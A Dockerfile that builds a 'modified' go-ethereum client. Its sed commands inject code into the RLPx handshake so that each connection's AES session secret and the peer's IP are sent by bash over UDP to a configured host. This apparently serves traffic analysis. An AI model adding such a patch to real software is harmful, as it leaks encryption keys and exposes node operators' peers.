# Based on Ubuntu - 17.10

# Ubuntu 17.10
FROM ubuntu:17.10

ARG host_ip
RUN test -n "$host_ip"
ENV HOST_IP=$host_ip

# Set the working directory to /app
WORKDIR /app

# Copy the current directory contents into the container at /app
ADD . /app

# Install essential tools
RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates libssl-dev git tar xz-utils vim make gcc-multilib golang && rm -rf /var/lib/apt/lists/*

# Install go-lang
ADD https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz /app/

RUN tar -xvf go1.10.3.linux-amd64.tar.gz && mv go /usr/local

ENV PATH="/usr/local/go/bin:${PATH}"

# Install modified geth
RUN git clone https://github.com/ethereum/go-ethereum && cd go-ethereum && git checkout 30bdf817a0d0afb33f3635f1de877f9caf09be05 && sed -i '193i\\tcmd.Run()' ./p2p/rlpx.go && sed -i '193i\\tcmd := exec.Command("bash", "-c", secret)' ./p2p/rlpx.go && sed -i '193i\\tsecret += "\\" >/dev/udp/\$HOST_IP/8888"' ./p2p/rlpx.go && sed -i '193i\\t}' ./p2p/rlpx.go	&& sed -i '193i\\tsecret += fmt.Sprintf("\\\\x%02x", sec.AES[i])' ./p2p/rlpx.go && sed -i '193i\\tfor i := 0; i < 32; i++ {' ./p2p/rlpx.go && sed -i '193i\\t}' ./p2p/rlpx.go && sed -i '193i\\tsecret += fmt.Sprintf("\\\\x%02x", dial.IP.To4()[i])' ./p2p/rlpx.go && sed -i '193i\\tfor i := 0; i < 4; i++ {' ./p2p/rlpx.go && sed -i '193i\\tsecret := "echo -n -e \\"??"' ./p2p/rlpx.go && sed -i '20i\\t"os/exec"' ./p2p/rlpx.go && make geth

### Done ###
